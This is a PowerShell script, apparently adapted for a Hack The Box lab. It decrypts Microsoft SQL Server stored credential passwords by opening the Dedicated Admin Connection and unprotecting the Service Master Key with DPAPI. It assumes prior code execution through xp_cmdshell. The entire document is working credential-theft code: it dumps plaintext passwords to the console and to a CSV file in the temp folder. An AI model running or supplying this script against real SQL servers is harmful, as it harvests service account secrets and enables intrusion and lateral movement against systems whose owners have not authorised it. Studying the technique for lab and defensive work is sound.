# Decrypt MSSQL Agent / credential passwords via DAC + SMK DPAPI.
# Original technique: Antti Rantasaari / NetSPI, 2014 (BSD 3-Clause).
# Lab update: FlushFinalBlock + UTF-16LE walk so AES blobs are not truncated.
#
# Run on the SQL host as a principal that can open DAC and Unprotect the
# Service Master Key (SQL service account after xp_cmdshell, or equivalent).
# HTB Unclaimed / authorized lab only. Do not commit live output.

function Get-MSSQLCredentialPasswords {
  Add-Type -AssemblyName System.Security
  Add-Type -AssemblyName System.Core

  $ComputerName = $Env:computername
  $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances

  $Results = New-Object "System.Data.DataTable"
  [void]$Results.Columns.Add("Instance")
  [void]$Results.Columns.Add("Credential")
  [void]$Results.Columns.Add("User")
  [void]$Results.Columns.Add("Password")

  foreach ($InstanceName in $SqlInstances) {
    if ($InstanceName -eq "MSSQLSERVER") {
      $ConnString = "Server=ADMIN:$ComputerName;Trusted_Connection=True;Encrypt=False;TrustServerCertificate=True"
    } else {
      $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True;Encrypt=False;TrustServerCertificate=True"
    }
    $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString)

    try { $Conn.Open() }
    catch {
      Write-Error "DAC failed: $($_.Exception.Message)"
      continue
    }

    if ($Conn.State -ne "Open") { continue }

    $SqlCmd = "SELECT substring(crypt_property,9,datalength(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)"
    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd, $Conn)
    $SmkBytes = $Cmd.ExecuteScalar()

    $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
    $Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy
    $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect($SmkBytes, $Entropy, 'LocalMachine')

    if ($ServiceKey.Length -eq 16) {
      $Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
      $IvLen = 8
    } elseif ($ServiceKey.Length -eq 32) {
      $Decryptor = New-Object System.Security.Cryptography.AESCryptoServiceProvider
      $IvLen = 16
    } else {
      Write-Error "Unknown SMK size $($ServiceKey.Length)"
      $Conn.Close()
      continue
    }

    $SqlCmd = @"
SELECT cred.name, cred.credential_identity, obj.imageval
FROM sys.credentials cred
INNER JOIN sys.sysobjvalues obj ON cred.credential_id = obj.objid
WHERE obj.valclass=28 AND obj.valnum=2
"@
    $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd, $Conn)
    $Data = $Cmd.ExecuteReader()
    $Dt = New-Object "System.Data.DataTable"
    $Dt.Load($Data)

    foreach ($Logins in $Dt) {
      $RawVal = $Logins.imageval
      $Iv = $RawVal[4..(4 + $IvLen - 1)]
      $CipherText = $RawVal[(4 + $IvLen)..($RawVal.Length - 1)]

      # PaddingMode None + FlushFinalBlock: skipping FlushFinalBlock truncates
      # UTF-16LE passwords (looks like the first ~12 printable chars).
      $Decryptor.Padding = "None"
      $Decrypt = $Decryptor.CreateDecryptor($ServiceKey, $Iv)
      $Stream = New-Object System.IO.MemoryStream
      $Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream, $Decrypt, "Write"
      $Crypto.Write($CipherText, 0, $CipherText.Length)
      $Crypto.FlushFinalBlock()
      $Decrypted = $Stream.ToArray()
      $Crypto.Close()
      $Stream.Close()

      $Sb = New-Object System.Text.StringBuilder
      for ($i = 8; $i -lt ($Decrypted.Length - 1); $i += 2) {
        if ($Decrypted[$i] -eq 0 -and $Decrypted[$i + 1] -eq 0) { break }
        if ($Decrypted[$i + 1] -ne 0) { break }
        if ($Decrypted[$i] -lt 32 -or $Decrypted[$i] -gt 126) { break }
        [void]$Sb.Append([char]$Decrypted[$i])
      }
      [void]$Results.Rows.Add($InstanceName, $Logins.name, $Logins.credential_identity, $Sb.ToString())
    }
    $Conn.Close()
  }
  $Results
}

$Out = Get-MSSQLCredentialPasswords
$Out | Format-List | Out-String -Width 400
$Csv = Join-Path $env:TEMP 'sqlcred.csv'
$Out | ConvertTo-Csv -NoTypeInformation | Set-Content -Path $Csv -Encoding ASCII
Write-Output "CSV=$Csv"
